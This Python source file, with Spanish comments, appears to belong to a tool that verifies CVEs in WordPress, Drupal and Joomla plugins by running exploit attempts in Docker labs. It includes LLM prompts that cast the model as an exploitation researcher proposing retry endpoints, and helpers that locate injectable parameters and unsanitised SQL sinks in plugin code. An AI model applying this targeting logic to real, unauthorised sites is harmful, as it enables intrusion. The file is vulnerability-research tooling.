# "respuesta_muestra_primer_intento" -- mismo patron que _GENERIC_PATH_TRAVERSAL_RETRY_EVIDENCE_KEYS.
_RESPUESTA_MUESTRA_EVIDENCE_KEYS = {"respuesta_cuerpo_recorte": "respuesta_muestra_primer_intento"}


# prompt generico (no ligado a una tecnica concreta) para tecnicas que todavia no tienen su
# propio _X_RETRY_SYS a medida -- cubre cualquier verificador que ya capture un recorte REAL del
# cuerpo de la respuesta en wr.evidence. Pedido explicitamente: el bucle de aprendizaje-y-reintento
# tiene que llegar a TODOS los ataques y casos, no solo a los 3 primeros (SQLi, path-traversal
# WordPress, path-traversal generico) -- escribir un prompt a medida por cada una de las ~36
# funciones verify_* no escala, asi que este generico (parametrizado con el nombre de la tecnica
# en el propio mensaje, no en el prompt de sistema) cubre el resto.
_GENERIC_RETRY_SYS = (
    "Eres un investigador de explotacion para objetivos AUTORIZADOS (pentest/CTF/research). Un "
    "intento de explotar una vulnerabilidad real -- contra un laboratorio real (CMS instalado de "
    "verdad con base de datos real, o un contenedor Docker construido desde el propio codigo del "
    "CVE) -- no se confirmo. Te doy el nombre de la tecnica, el endpoint/parametro probados, y un "
    "recorte del cuerpo REAL de la respuesta observada. Lee esa evidencia como lo haria un "
    "analista humano revisando un negativo: si el cuerpo muestra una pista CONCRETA de que el "
    "endpoint o el parametro probados no son los correctos (p.ej. un error de la propia app, un "
    "404/'Page not found', una redireccion a login, contenido que no tiene nada que ver con el "
    "objetivo esperado...), sugiere UN cambio concreto de endpoint y/o parametro que valga la "
    "pena reintentar. Si la evidencia NO da ninguna pista util (la respuesta parece normal/"
    "esperada y aun asi no se confirma), dilo honestamente -- NUNCA inventes un cambio sin base "
    "en la evidencia real que te doy. Responde SOLO con JSON: {\"tiene_sugerencia\": true/false, "
    "\"razon\": \"una frase, citando la pista concreta de la evidencia\", "
    "\"endpoint_alternativo\": \"...\" (opcional, solo si tiene_sugerencia), "
    "\"parametro_alternativo\": \"...\" (opcional)}"
)

# version de _GENERIC_RETRY_SYS CONSCIENTE de que el objetivo es WordPress -- para las tecnicas
# WordPress que todavia usan el prompt generico (sin mencion de nonce/wp-admin, que no tendria
# sentido para Drupal/Node/un contenedor Docker cualquiera, los otros objetivos que ese mismo
# prompt generico cubre). Mismo mecanismo que _SQLI_RETRY_SYS/_PATH_TRAVERSAL_RETRY_SYS
# (_WP_NONCE_SETUP_RETRY_HINT), parametrizado por el nombre de la tecnica en el propio mensaje,
# no en el prompt -- para no escribir un _X_RETRY_SYS a medida por cada una de las ~12 tecnicas
# WordPress restantes.
_WP_GENERIC_RETRY_SYS = (
    "Eres un investigador de explotacion para objetivos AUTORIZADOS (pentest/CTF/research). Un "
    "intento de explotar una vulnerabilidad real contra un laboratorio WordPress REAL (plugin "
    "instalado, MySQL real) no se confirmo. Te doy el nombre de la tecnica, el endpoint/"
    "parametro probados, y un recorte del cuerpo REAL de la respuesta observada. Lee esa "
    "evidencia como lo haria un analista humano revisando un negativo: si el cuerpo muestra una "
    "pista CONCRETA de que el endpoint o el parametro probados no son los correctos (p.ej. un "
    "error de la propia app, un 404/'Page not found', una redireccion a login, contenido que no "
    "tiene nada que ver con el objetivo esperado...), sugiere UN cambio concreto de endpoint y/o "
    "parametro que valga la pena reintentar. Si la evidencia NO da ninguna pista util, dilo "
    "honestamente -- NUNCA inventes un cambio sin base en la evidencia real que te doy. "
    + _WP_NONCE_SETUP_RETRY_HINT +
    "Responde SOLO con JSON: {\"tiene_sugerencia\": true/false, \"razon\": \"una frase, citando "
    "la pista concreta de la evidencia\", \"endpoint_alternativo\": \"...\" (opcional, solo si "
    "tiene_sugerencia), \"parametro_alternativo\": \"...\" (opcional), "
    + _WP_NONCE_SETUP_RETRY_JSON_FIELDS + "}"
)
_WP_GENERIC_RETRY_EVIDENCE_KEYS = {
    "respuesta_cuerpo_recorte": "respuesta_cuerpo_recorte",
    "diagnostico_scraping_nonce": "nonce_scraping_diagnostico"}
_WP_GENERIC_MUESTRA_EVIDENCE_KEYS = {
    "respuesta_cuerpo_recorte": "respuesta_muestra_primer_intento",
    "diagnostico_scraping_nonce": "nonce_scraping_diagnostico"}


def _llm_suggest_retry_from_evidence(llm, system_prompt: str, wr: Any,
                                     evidence_keys: dict, technique_label: str = "") -> Optional[dict]:
    """Automatiza, con el LLM, el mismo paso que un analista humano hace a mano tras un negativo:
    leer el cuerpo REAL de la respuesta y la evidencia observada, y decidir si hay una pista
    concreta que apunte a un endpoint/parametro distinto que valga la pena reintentar -- en vez de
    rendirse en el primer intento. Nunca inventa una sugerencia sin base: si la evidencia no da
    pistas, el propio prompt le pide decirlo (`tiene_sugerencia: false`), y aqui se respeta eso
    devolviendo None en vez de forzar un reintento a ciegas. Devuelve None tambien si no hay LLM
    disponible, o si la respuesta no es JSON valido -- nunca lanza, un fallo aqui solo significa
    'sin sugerencia', no debe tirar abajo la investigacion.

    `system_prompt` es especifico de la tecnica (ver _SQLI_RETRY_SYS/_PATH_TRAVERSAL_RETRY_SYS --
    cada tecnica tiene su propia evidencia relevante y no conviene reutilizar el mismo prompt tal
    cual). `evidence_keys` mapea {etiqueta_para_el_LLM: clave_real_en_wr.evidence}, asi esta misma
    funcion sirve para cualquier verificador sin saber de antemano que evidencia concreta captura
    cada uno."""
    if llm is None or not getattr(llm, "available", lambda: False)():
        return None
    evidence = {label: wr.evidence.get(key) for label, key in evidence_keys.items()}
    evidence["detalle"] = wr.detail
    if technique_label:
        evidence["tecnica"] = technique_label
    from ..llm.base import Message
    prompt = f"Evidencia real observada:\n{json.dumps(evidence, ensure_ascii=False)[:3000]}"
    try:
        raw = llm.chat([Message("system", system_prompt), Message("user", prompt)], json_mode=True)
        data = json.loads(raw)
    except Exception:
        return None
    if not isinstance(data, dict) or not data.get("tiene_sugerencia"):
        return None
    if not (data.get("endpoint_alternativo") or data.get("parametro_alternativo")
           or data.get("pagina_extra_para_nonce") or data.get("pagina_setup_admin_requerida")
           or data.get("parametro_adicional_requerido")):
        return None
    return data


def _run_evidence_retry_loop(llm, step, es: bool, system_prompt: str, evidence_keys: dict,
                             attempt_fn, wr: Any, endpoint, param,
                             technique_label: str = "", max_attempts: int = _RETRY_MAX_ATTEMPTS,
                             on_suggestion: Optional[Callable[[dict], None]] = None
                             ) -> Any:
    """Bucle de aprendizaje-y-reintento COMPARTIDO por cualquier verificador dinamico (no solo
    SQLi/path-traversal): tras un negativo, le pide al LLM (`_llm_suggest_retry_from_evidence`)
    que lea la evidencia real y, solo si ve una pista concreta, reintenta con el endpoint/
    parametro sugerido. Acotado a `max_attempts` intentos en total (nunca infinito -- cada
    intento levanta un laboratorio Docker real entero); para en cuanto se confirma o en cuanto
    el LLM deja de ver ninguna pista nueva. `attempt_fn(endpoint, param) -> WpVerifyResult` es un
    closure que el sitio de llamada define localmente, porque cada verify_* tiene su propia firma
    (distintos nombres de kwargs, distinto numero de argumentos posicionales) -- aqui no se sabe
    ni se necesita saber como es esa firma. `on_suggestion(suggestion_dict)`, si se da, se llama
    con el JSON crudo de CADA sugerencia (antes de aplicar endpoint/param) -- para que un sitio de
    llamada pueda leer un campo propio de su `system_prompt` a medida (p.ej. _SQLI_RETRY_SYS trae
    'pagina_extra_para_nonce') sin que este bucle generico tenga que saber nada de el; el sitio de
    llamada suele usarlo para mutar una lista en su propio scope que su `attempt_fn` ya captura por
    closure, en vez de ampliar la firma de endpoint/param (que SI cambiaria los ~20 sitios donde ya
    se usa este bucle). Nunca lanza si `on_suggestion` falla -- un fallo ahi no debe tirar abajo un
    reintento que de otro modo iria bien."""
    retry_endpoint, retry_param = endpoint, param
    for attempt_n in range(1, max_attempts):
        if wr.verified or not wr.available:
            break
        suggestion = _llm_suggest_retry_from_evidence(llm, system_prompt, wr, evidence_keys,
                                                      technique_label=technique_label)
        if not suggestion:
            break
        if on_suggestion is not None:
            try:
                on_suggestion(suggestion)
            except Exception:
                pass
        retry_endpoint = suggestion.get("endpoint_alternativo") or retry_endpoint
        retry_param = suggestion.get("parametro_alternativo") or retry_param
        step((f"el LLM reviso la evidencia real (intento {attempt_n + 1}/{max_attempts}) y "
             f"sugiere reintentar con endpoint={retry_endpoint!r} parametro={retry_param!r} -- "
             f"razon: {suggestion.get('razon')}") if es else
             (f"the LLM reviewed the real evidence (attempt {attempt_n + 1}/{max_attempts}) "
             f"and suggests retrying with endpoint={retry_endpoint!r} "
             f"parameter={retry_param!r} -- reason: {suggestion.get('razon')}"))
        wr_retry = attempt_fn(retry_endpoint, retry_param)
        wr_retry.detail = (f"[reintento {attempt_n + 1}/{max_attempts} sugerido por el LLM tras "
                          f"leer la evidencia real: {suggestion.get('razon')}] " + wr_retry.detail)
        wr = wr_retry
    return wr


def _retry_or_keep_lab_alive(keep_lab_on_failure: bool, step, es: bool, wr: Any,
                             retry_fn: Callable[[], Any]) -> Any:
    """Envuelve CUALQUIER bucle de aprendizaje-y-reintento de WordPress (no solo SQLi, donde se
    encontro este bloqueo por primera vez): si se pidio --keep-lab-on-failure, NO reintenta --
    reintentar DESTRUIRIA el unico laboratorio de este primer intento para levantar uno nuevo
    (cada verify_wordpress_* crea su propio _Lab independiente), dejando ademas varios
    contenedores huerfanos vivos si cada intento tambien fallara, en vez de UNO solo para
    inspeccionar. Se deja el laboratorio de este primer/unico intento vivo en su lugar.
    `retry_fn` ejecuta el bucle real (closure sin argumentos, definido en el sitio de llamada,
    que ya conoce su propia firma de _run_evidence_retry_loop -- distinta en cada tecnica)."""
    if not keep_lab_on_failure:
        return retry_fn()
    if not wr.verified:
        step("--keep-lab-on-failure pedido: no se reintenta (reintentar destruiria este mismo "
             "laboratorio para levantar uno nuevo) -- se deja el unico laboratorio de este "
             "intento VIVO para inspeccion manual" if es else
             "--keep-lab-on-failure requested: not retrying (a retry would destroy this same "
             "lab to spin up a new one) -- leaving this attempt's lab ALIVE for manual "
             "inspection instead")
    return wr


def _apply_generic_wp_suggestion(sug: dict, extra_nonce_pages: list,
                                 extra_setup_trigger_paths: list, params) -> None:
    """Aplica los TRES campos genericos que cualquier sugerencia de retry de WordPress puede
    traer (ver _WP_NONCE_SETUP_RETRY_HINT, compartido por las 13 tecnicas) -- factorizado para
    no repetir la misma mutacion en cada sitio de llamada, y para que ninguna tecnica se quede
    (como pasaba antes: solo SQLi lo leia) sin aplicar 'parametro_adicional_requerido' aunque su
    propio prompt YA se lo pida al LLM igual que a SQLi.

    'pagina_extra_para_nonce'/'pagina_setup_admin_requerida' se acumulan en listas que el sitio
    de llamada ya captura por closure (y pasa como extra_nonce_pages/extra_setup_trigger_paths
    al siguiente intento). 'parametro_adicional_requerido' -- un campo que el endpoint exige
    ADEMAS del que se esta inyectando, p.ej. 'directory_id' en CVE-2024-1071, donde el sumidero
    real nunca se ejecutaba sin el -- se AÑADE a `params` in place, nunca sustituye al
    parametro inyectable en si (ese sigue siendo el que ya se le paso a _run_evidence_retry_loop
    aparte)."""
    p = sug.get("pagina_extra_para_nonce")
    if p and p not in extra_nonce_pages:
        extra_nonce_pages.append(p)
    sp = sug.get("pagina_setup_admin_requerida")
    if sp and sp not in extra_setup_trigger_paths:
        extra_setup_trigger_paths.append(sp)
    extra_p = sug.get("parametro_adicional_requerido")
    if extra_p:
        if isinstance(params, dict):
            params.setdefault(extra_p, "1")
        elif extra_p not in params:
            params.append(extra_p)


def _looks_like_drupal_module(local_path: str, plugin_dir: str) -> bool:
    """True si `plugin_dir` dentro de `local_path` tiene pinta de modulo/tema de Drupal (un
    .info.yml con 'type: module|theme') en vez de un plugin de WordPress -- desambigua el caso
    local-zip/zip-url/git, donde `fr.kind` no dice de que CMS es (a diferencia de
    'wordpress-plugin' o 'drupal-module', que ya lo dicen sin tener que mirar el contenido)."""
    if not plugin_dir:
        return False
    sub = os.path.join(local_path, plugin_dir)
    try:
        for fn in os.listdir(sub):
            if not fn.lower().endswith(".info.yml"):
                continue
            with open(os.path.join(sub, fn), "r", encoding="utf-8", errors="replace") as f:
                head = f.read(2000)
            if re.search(r"^\s*type\s*:\s*['\"]?(module|theme)['\"]?\s*$", head, re.M | re.I):
                return True
    except OSError:
        pass
    return False


def _looks_like_joomla_extension(local_path: str, plugin_dir: str) -> bool:
    """True si `plugin_dir` dentro de `local_path` tiene pinta de extension de Joomla (un .xml de
    manifiesto con `<extension type="component|module|plugin|template|library|package">`) --
    mismo desambiguador que _looks_like_drupal_module pero para el caso local-zip/zip-url/git de
    Joomla."""
    if not plugin_dir:
        return False
    sub = os.path.join(local_path, plugin_dir)
    try:
        for fn in os.listdir(sub):
            if not fn.lower().endswith(".xml"):
                continue
            with open(os.path.join(sub, fn), "r", encoding="utf-8", errors="replace") as f:
                head = f.read(2000)
            if re.search(r"<extension\b[^>]*\btype\s*=\s*['\"]"
                        r"(component|module|plugin|template|library|package)['\"]", head, re.I):
                return True
    except OSError:
        pass
    return False


def _apply_wpverify_result(inv, wr, es: bool, llm=None) -> None:
    """Vuelca un WpVerifyResult (ver workflows/wpverify.py) en la investigacion -- mismo volcado
    que los bloques de missing-authorization/idor/path-traversal/command-injection/sqli/ssrf
    repetian literal; centralizado aqui para las clases que se fueron anadiendo despues (xss,
    ssti, xxe, open-redirect, file-upload, csrf) sin repetir el mismo bloque de 15 lineas otra vez
    por cada una. `llm` actualmente no se usa aqui (reservado para una futura explicacion
    razonada del negativo con el LLM); el parametro ya existe para no tener que volver a tocar
    los ~30 call sites otra vez cuando se conecte."""
    inv.dynamic_verify = {"attempted": True, "available": wr.available, "ok": wr.ok,
                          "verified": wr.verified, "detail": wr.detail, "logs": wr.logs}
    inv.attempt_evidence = wr.evidence
    if wr.verified:
        inv.verified = True
        inv.verified_detail = wr.detail
        inv.verified_evidence = wr.evidence
    elif not wr.available:
        inv.blockers.append(("verificacion dinamica no intentada: " + wr.limitations[0]
                             if wr.limitations else
                             "verificacion dinamica no disponible (sin Docker)"))
    else:
        inv.blockers.append((f"verificacion dinamica intentada pero no confirmada: {wr.detail}"
                             if es else
                             f"dynamic verification attempted but not confirmed: {wr.detail}"))
        for entry in wr.logs:
            if entry.startswith("docker logs"):
                head, _, body = entry.partition("\n")
                # Primeras 30 lineas: el mensaje "Error: xxx" esta al INICIO del log,
                # no al final. [-15:] solo mostraba el stack trace, ocultando la causa real.
                trimmed = "\n".join(body.splitlines()[:30])
                inv.blockers.append(f"{head}:\n```\n{trimmed}\n```")
        _attach_grounded_source_snippets(inv, es)


def _attach_grounded_source_snippets(inv: "Investigation", es: bool) -> None:
    """Cuando una verificacion dinamica se intento pero NO se confirmo, adjunta el codigo REAL de
    cada funcion ya confirmada por grounding (inv.source_grounding['found'], fichero:linea exactos
    -- ver grep_vulnerable_functions) como blocker, en vez de dejar que el analista tenga que
    bajarse el plugin y grep-earlo a mano para diagnosticar un negativo (confirmado en vivo,
    CVE-2024-50508: eso fue exactamente lo que hubo que hacer, con una funcion asi encontrada
    manualmente revelando que el handler no valida nada -- este paso lo automatiza).
    No es una garantia de diagnostico (sigue siendo un negativo honesto hasta que alguien lo lea),
    pero deja el codigo real delante en el propio informe, no solo la hipotesis."""
    from .websource import extract_function_body
    local_path = (inv.source_fetch or {}).get("local_path") or ""
    found = (inv.source_grounding or {}).get("found") or {}
    if not local_path or not found:
        return
    for name, locations in found.items():
        if not locations:
            continue
        loc = locations[0]
        rel_file, _, line_str = loc.rpartition(":")
        if not rel_file or not line_str.isdigit():
            continue
        body = extract_function_body(local_path, rel_file, int(line_str))
        if body:
            inv.blockers.append(
                (f"codigo real de '{name}' ({loc}), para diagnosticar el negativo sin tener que "
                 f"descargar el plugin a mano:\n```php\n{body}\n```" if es else
                 (f"real code of '{name}' ({loc}), to diagnose the negative without having to "
                 f"download the plugin by hand:\n```php\n{body}\n```")))

    # para SQLi en concreto: la funcion que el LLM/el PoC publico citan puede estar bien
    # parametrizada (ej. $wpdb->prepare(..., '%d', ...)) aunque la CVE sea real -- confirmado en
    # vivo, CVE-2024-3552: la hipotesis citaba 'w2dc_get_map_marker_info' (una consulta YA
    # parametrizada, segura de verdad), pero el sumidero real sin saneo ('$where .= "..." .
    # $_GET[...] . "..."') estaba en OTRA funcion por completo (level_filter_where), que ni el
    # LLM ni el PoC mencionaban nunca. En vez de rendirse en ese negativo, se busca en TODO el
    # plugin (no solo lo ya citado) un patron real de concatenacion sin saneo -- igual que un
    # analista humano habria hecho al ver que la funcion citada resultaba segura.
    if inv.vuln_class in ("sqli", "sql-injection") and local_path:
        from .websource import find_unsafe_sql_concat_sinks
        plugin_dir = (inv.source_fetch or {}).get("plugin_dir") or ""
        sinks = find_unsafe_sql_concat_sinks(local_path, plugin_dir)
        already_cited = set(found.keys())
        new_sinks = [s for s in sinks if s.function not in already_cited][:3]
        if new_sinks:
            for s in new_sinks:
                inv.blockers.append(
                    (f"CANDIDATO MAS PROMETEDOR encontrado en el resto del codigo (no citado "
                     f"por la hipotesis): '{s.function}' en {s.file}:{s.line} lee "
                     f"'{s.param}' y lo concatena en SQL SIN saneo visible -- "
                     f"`{s.snippet}`. Prueba con --endpoint/--params/--functions apuntando "
                     f"a este parametro en vez de la hipotesis original." if es else
                     (f"MORE PROMISING CANDIDATE found in the rest of the source (not cited "
                     f"by the hypothesis): '{s.function}' at {s.file}:{s.line} reads "
                     f"'{s.param}' and concatenates it into SQL with no visible sanitization "
                     f"-- `{s.snippet}`. Try --endpoint/--params/--functions pointing at this "
                     f"parameter instead of the original hypothesis.")))


def _extract_known_ajax_action(notes: dict) -> Optional[str]:
    """Extrae el valor REAL de 'action' de admin-ajax.php ya conocido (del PoC crudo o de la
    hipotesis), si lo hay: de notes['parameters'] (dict con clave 'action') o, si no, de la query
    string de notes['endpoint'] (?action=...). Devuelve None si no hay ninguno conocido."""
    params = notes.get("parameters")
    if isinstance(params, dict):
        action = params.get("action")
        if isinstance(action, str) and action.strip():
            return action.strip()
    endpoint = notes.get("endpoint") or ""
    m = re.search(r"[?&]action=([A-Za-z0-9_]+)", endpoint)
    if m:
        return m.group(1)
    return None


def _deterministic_web_hints_from_source(local_path: str, found: dict) -> Optional[dict]:
    """Complementa (y cuando discrepan, GANA sobre) el refinamiento del LLM con un grep LITERAL
    del codigo real: el registro EXACTO del hook `add_action('wp_ajax...')` que de verdad engancha
    la funcion citada, y los nombres de campo EXACTOS que esa funcion lee de $_POST/$_REQUEST/
    $_GET. Esto es precisamente lo que el analista tuvo que hacer a mano en CVE-2025-3605 (la
    hipotesis del LLM decia action=flr_blocks_user_settings y parameters=[email,password]; el
    codigo real registra flrblocksusersettingsupdatehandle y lee flr-blocks-email-update) --
    convertirlo en un grep deterministico, en vez de depender de que el LLM transcriba bien un
    fragmento de codigo, hace la correccion automatica y repetible, sin que el analista tenga que
    inspeccionar el fichero a mano cada vez. Tambien reconoce la REST API de WordPress
    (register_rest_route()/$request->get_param()), cada vez mas comun en plugins modernos que no
    usan admin-ajax.php en absoluto. Devuelve None si no hay nada que extraer."""
    import os as _os
    import re as _re
    action_re = _re.compile(r"add_action\s*\(\s*['\"]wp_ajax(?:_nopriv)?_([A-Za-z0-9_]+)['\"]")
    rest_route_re = _re.compile(
        r"register_rest_route\s*\(\s*['\"]([^'\"]+)['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*,")
    rest_methods_re = _re.compile(r"['\"]methods['\"]\s*=>\s*(?:['\"]([A-Za-z,\s]+)['\"]|"
                                  r"(WP_REST_Server::[A-Z]+))")
    field_re = _re.compile(r"\$_(?:POST|REQUEST|GET)\s*\[\s*['\"]([A-Za-z0-9_\-]+)['\"]\s*\]")
    # Captura accesos de array anidado tipo $_POST['order'][0]['dir'] -> "order[0][dir]"
    # (DataTables y otros patrones jQuery donde el parametro vulnerable esta dentro de un array).
    nested_array_re = _re.compile(
        r"\$_(?:POST|REQUEST|GET)\s*\[\s*['\"]([A-Za-z0-9_\-]+)['\"]\s*\]"
        r"\s*\[(\d+)\]\s*\[\s*['\"]([A-Za-z0-9_\-]+)['\"]\s*\]"
    )
    rest_param_re = _re.compile(r"->get_param\s*\(\s*['\"]([A-Za-z0-9_\-]+)['\"]\s*\)")
    rest_json_body_re = _re.compile(r"->get_json_params\s*\(\s*\)|->get_body_params\s*\(\s*\)")
    fn_def_re_tmpl = r"function\s+{0}\s*\("
    func_decl_re = _re.compile(r"\s*(?:public |private |protected |static )*function\s+\w+\s*\(")

    best_action = None
    best_endpoint = None
    best_fields: List[str] = []
    for name, locs in (found or {}).items():
        for loc in locs[:2]:
            file_part, _, _line_part = loc.rpartition(":")
            fpath = _os.path.join(local_path, file_part)
            try:
                with open(fpath, "r", encoding="utf-8", errors="replace") as f:
                    text = f.read()
            except OSError:
                continue
            lines = text.splitlines()
            fn_def_re = _re.compile(fn_def_re_tmpl.format(_re.escape(name)))
            body_start = next((i for i, l in enumerate(lines) if fn_def_re.search(l)), None)
            if body_start is not None:
                indent = len(lines[body_start]) - len(lines[body_start].lstrip())
                body_end = len(lines)
                for j in range(body_start + 1, len(lines)):
                    if func_decl_re.match(lines[j]):
                        j_indent = len(lines[j]) - len(lines[j].lstrip())
                        if j_indent <= indent:
                            body_end = j
                            break
                body_text = "\n".join(lines[body_start:body_end])
                for m in field_re.finditer(body_text):
                    if m.group(1) not in best_fields:
                        best_fields.append(m.group(1))
                # Reemplaza la clave simple por la ruta completa cuando el handler accede a un
                # array anidado (p.ej. $_POST['order'][0]['dir'] -> "order[0][dir]"): esto
                # preserva el path exacto que necesita el verificador de SQLi ORDER BY para
                # construir el payload correcto en vez de inyectar en la clave exterior "order".
                for m in nested_array_re.finditer(body_text):
                    nested_path = f"{m.group(1)}[{m.group(2)}][{m.group(3)}]"
                    outer_key = m.group(1)
                    if outer_key in best_fields:
                        best_fields[best_fields.index(outer_key)] = nested_path
                    elif nested_path not in best_fields:
                        best_fields.append(nested_path)
                for m in rest_param_re.finditer(body_text):
                    if m.group(1) not in best_fields:
                        best_fields.append(m.group(1))
                if rest_json_body_re.search(body_text) and "<json_body>" not in best_fields:
                    best_fields.append("<json_body>")
            # el add_action/register_rest_route que registra ESTA funcion puede vivir en otra
            # parte del fichero (o de la clase) -- se busca por mencion literal del nombre de la
            # funcion dentro de la propia llamada de registro (callback directo o
            # `[$this, 'nombre']`), y se queda con el mas cercano a su definicion si hubiera
            # varios candidatos.
            candidates = []
            for m in action_re.finditer(text):
                call_end = text.find(")", m.end())
                call_text = text[m.start():call_end if call_end != -1 else m.end() + 200]
                if name in call_text:
                    hook_line = text[:m.start()].count("\n")
                    candidates.append((abs(hook_line - (body_start if body_start is not None else hook_line)),
                                       m.group(1)))
            if candidates:
                candidates.sort(key=lambda c: c[0])
                best_action = candidates[0][1]

            rest_candidates = []
            for m in rest_route_re.finditer(text):
                # el bloque de opciones (methods/callback/permission_callback) viene justo
                # despues de la coma final del match, hasta el siguiente ');' razonable --
                # heuristica por tamano fijo, igual de laxa que el resto de este extractor.
                call_text = text[m.end():m.end() + 500]
                if name not in call_text:
                    continue
                namespace, route = m.group(1), m.group(2)
                mm = rest_methods_re.search(call_text)
                method = ""
                if mm:
                    raw = (mm.group(1) or mm.group(2) or "").strip()
                    method = {"WP_REST_Server::READABLE": "GET",
                             "WP_REST_Server::CREATABLE": "POST",
                             "WP_REST_Server::EDITABLE": "POST",
                             "WP_REST_Server::DELETABLE": "DELETE",
                             "WP_REST_Server::ALLMETHODS": "POST"}.get(raw, raw.split(",")[0].strip().upper())
                hook_line = text[:m.start()].count("\n")
                rest_candidates.append((abs(hook_line - (body_start if body_start is not None else hook_line)),
                                        namespace.strip("/"), route.strip("/"), method or "POST"))
            if rest_candidates:
                rest_candidates.sort(key=lambda c: c[0])
                _dist, namespace, route, method = rest_candidates[0]
                best_endpoint = (f"/wp-json/{namespace}/{route}", method)

    if not best_action and not best_endpoint and not best_fields:
        return None
    out: dict = {}
    if best_endpoint:
        out["endpoint"], out["http_method"] = best_endpoint
    elif best_action:
        out["endpoint"] = f"/wp-admin/admin-ajax.php?action={best_action}"
        out["http_method"] = "POST"  # todas las acciones wp_ajax_* se invocan siempre via POST
    if best_fields:
        out["parameters"] = best_fields
    return out


def _php_function_body(text: str, name: str) -> Optional[str]:
    """Texto del CUERPO de la funcion/metodo `name` dentro de `text` -- heuristica por
    indentacion (busca la siguiente declaracion de funcion al mismo nivel o menor como el final),
    compartida por los tres extractores deterministas de CMS (WordPress/Drupal/Joomla) para no
    repetir la misma logica de limites de funcion tres veces."""
    import re as _re
    lines = text.splitlines()
    fn_def_re = _re.compile(rf"function\s+{_re.escape(name)}\s*\(")
    func_decl_re = _re.compile(r"\s*(?:public |private |protected |static )*function\s+\w+\s*\(")
    body_start = next((i for i, l in enumerate(lines) if fn_def_re.search(l)), None)
    if body_start is None:
        return None
    indent = len(lines[body_start]) - len(lines[body_start].lstrip())
    body_end = len(lines)
    for j in range(body_start + 1, len(lines)):
        if func_decl_re.match(lines[j]):
            j_indent = len(lines[j]) - len(lines[j].lstrip())
            if j_indent <= indent:
                body_end = j
                break
    return "\n".join(lines[body_start:body_end])


def _deterministic_drupal_hints_from_source(local_path: str, found: dict) -> Optional[dict]:
    """Analogo Drupal de _deterministic_web_hints_from_source: busca en los *.routing.yml del
    modulo la ruta REAL cuyo `_controller` apunte al metodo citado (en vez de confiar en que el
    LLM transcriba bien el path), y dentro del cuerpo de ese metodo busca los nombres de campo
    REALES que lee del Request de Symfony (`$request->query/request->get('x')`,
    `Drupal::request()->get('x')`) o del Form API (`$form_state->getValue('x')`)."""
    import os as _os
    import re as _re
    controller_re = _re.compile(r"_controller\s*:\s*['\"]?([\w\\]+)::(\w+)['\"]?")
    path_re = _re.compile(r"^\s*path\s*:\s*['\"]([^'\"]+)['\"]", _re.M)
    methods_re = _re.compile(r"^\s*methods\s*:\s*\[?\s*([A-Za-z,\s]+)\]?", _re.M)
    request_field_re = _re.compile(
        r"(?:\$request(?:->query|->request)?|Drupal::request\(\))->get\(\s*['\"]([\w\-]+)['\"]")
    form_value_re = _re.compile(r"->getValue\(\s*['\"]([\w\-]+)['\"]")

    best_endpoint = None
    best_fields: List[str] = []
    for name, locs in (found or {}).items():
        # 1) la ruta: se busca en TODOS los *.routing.yml del modulo (puede haber varios ficheros,
        # p.ej. uno del core del modulo y otro de un submodulo).
        for dirpath, _dirs, files in _os.walk(local_path):
            for fn in files:
                if not fn.endswith(".routing.yml"):
                    continue
                try:
                    with open(_os.path.join(dirpath, fn), "r", encoding="utf-8", errors="replace") as f:
                        yml_text = f.read()
                except OSError:
                    continue
                for cm in controller_re.finditer(yml_text):
                    if cm.group(2) != name:
                        continue
                    # el 'path:' de ESTA ruta es el mas cercano HACIA ATRAS (misma convencion de
                    # indentacion YAML que el resto de este extractor -- heuristica, no un parser
                    # YAML real, igual que grep_vulnerable_functions en websource.py).
                    before = yml_text[:cm.start()]
                    pm = list(path_re.finditer(before))
                    if not pm:
                        continue
                    path = pm[-1].group(1)
                    after = yml_text[cm.end():cm.end() + 300]
                    mm = methods_re.search(after) or methods_re.search(before[-300:])
                    method = (mm.group(1).split(",")[0].strip().upper() if mm else "GET")
                    best_endpoint = (path, method)
        # 2) los campos: dentro del cuerpo REAL del metodo/funcion citado.
        for loc in locs[:2]:
            file_part, _, _line_part = loc.rpartition(":")
            fpath = _os.path.join(local_path, file_part)
            try:
                with open(fpath, "r", encoding="utf-8", errors="replace") as f:
                    text = f.read()
            except OSError:
                continue
            body = _php_function_body(text, name)
            if not body:
                continue
            for m in request_field_re.finditer(body):
                if m.group(1) not in best_fields:
                    best_fields.append(m.group(1))
            for m in form_value_re.finditer(body):
                if m.group(1) not in best_fields:
                    best_fields.append(m.group(1))

    if not best_endpoint and not best_fields:
        return None
    out: dict = {}
    if best_endpoint:
        path, method = best_endpoint
        out["endpoint"], out["http_method"] = path, method
        # un placeholder EN LA PROPIA RUTA (p.ej. '/mymodule/update/{uid}') no es un parametro de
        # query/body -- en Drupal, un segmento de ruta asi se pasa como ARGUMENTO del metodo del
        # controlador por su nombre (enlace de ruta de Symfony), nunca via $request->get(), que
        # es por lo que request_field_re/form_value_re nunca lo encuentran. Si el nombre del
        # placeholder tiene pinta de ID (mismas pistas que _ID_HINTS), se marca como id_param --
        # el mismo campo que ya usan TODOS los verificadores de account-takeover/csrf -- para que
        # drupalverify.py sepa SUSTITUIRLO dentro de la URL en vez de mandarlo como parametro
        # (ver _substitute_path_param en drupalverify.py).
        from .wpverify import _ID_HINTS as _drupal_id_hints
        for ph in _re.findall(r"\{(\w+)\}", path):
            low = ph.lower()
            if any(h in low for h in _drupal_id_hints):
                out["id_param"] = ph
                break
    if best_fields:
        out["parameters"] = best_fields
    return out


def _deterministic_joomla_hints_from_source(local_path: str, found: dict, slug: str) -> Optional[dict]:
    """Analogo Joomla de _deterministic_web_hints_from_source: dentro del cuerpo del metodo/
    funcion citado busca los campos REALES leidos de Joomla\\CMS\\Input\\Input
    ($input->getInt/getString/getCmd/getWord/getAlnum('x')), y el valor literal de 'task' si el
    propio codigo lo compara (p.ej. `if ($input->getCmd('task') === 'update')`) para construir el
    endpoint real `index.php?option=com_<slug>[&task=<valor>]` -- Joomla no tiene una convencion
    de ruta tan explicita como el *.routing.yml de Drupal o add_action() de WordPress, asi que
    esto es mas una inferencia que una lectura directa (documentado: menos fiable que los otros
    dos extractores, el analista deberia confirmar el 'task' real si lo hay)."""
    import os as _os
    import re as _re
    field_re = _re.compile(r"->get(?:Int|String|Cmd|Word|Alnum|)\(\s*['\"]([\w\-]+)['\"]")
    # el valor de 'task' casi siempre se compara en DOS pasos (se asigna a una variable, y la
    # variable se compara despues), no en una sola expresion -- se buscan ambos pasos por
    # separado y se encadenan, en vez de solo el caso (mas raro) de comparacion inline.
